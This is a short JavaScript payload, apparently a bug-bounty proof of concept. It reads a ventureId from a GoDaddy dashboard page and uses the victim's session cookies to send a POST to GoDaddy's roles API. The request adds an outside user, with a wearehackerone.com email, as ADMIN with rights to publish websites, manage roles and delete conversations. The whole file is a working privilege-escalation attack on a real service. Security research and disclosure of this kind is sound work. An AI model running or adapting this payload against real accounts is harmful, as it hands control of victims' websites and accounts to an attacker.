(() => {
  const html = document.documentElement.innerHTML;

  const match = html.match(/ventureId["']?\s*:\s*["']?([^"',}\s]+)/i);
  const resourceId = match ? match[1] : null;

  console.log("ventureId:", resourceId);

  if (!resourceId) {
    console.error("ventureId not found — aborting request");
    return;
  }

  const xhr = new XMLHttpRequest();
  xhr.open("POST", "https://api.godaddy.com/v2/roles/assignees", true);
  xhr.setRequestHeader("User-Agent", 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:148.0) Gecko/20100101 Firefox/148.0');
  xhr.setRequestHeader("Accept", '*/*');
  xhr.setRequestHeader("Accept-Language", 'en-US,en;q=0.9');
  xhr.setRequestHeader("Accept-Encoding", 'gzip, deflate, br');
  xhr.setRequestHeader("Content-Type", 'application/json');
  xhr.setRequestHeader("Origin", 'https://dashboard.godaddy.com');
  xhr.setRequestHeader("Sec-Fetch-Dest", 'empty');
  xhr.setRequestHeader("Sec-Fetch-Mode", 'cors');
  xhr.setRequestHeader("Sec-Fetch-Site", 'same-site');

  xhr.withCredentials = true;

  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
      console.log("Status:", xhr.status);
      console.log("Response:", xhr.responseText);
    }
  };

  xhr.send(JSON.stringify({
    permissionsToInclude: [
      "conversation_manage_settings",
      "conversation_reply",
      "conversation_delete",
      "package_view_and_manage_roles_users",
      "website_edit",
      "website_publish"
    ],
    userName: "asdasd",
    userEmail: "razii@wearehackerone.com",
    resourceId: resourceId,
    resourceType: "venture",
    defaultRole: "ADMIN"
  }));
})();
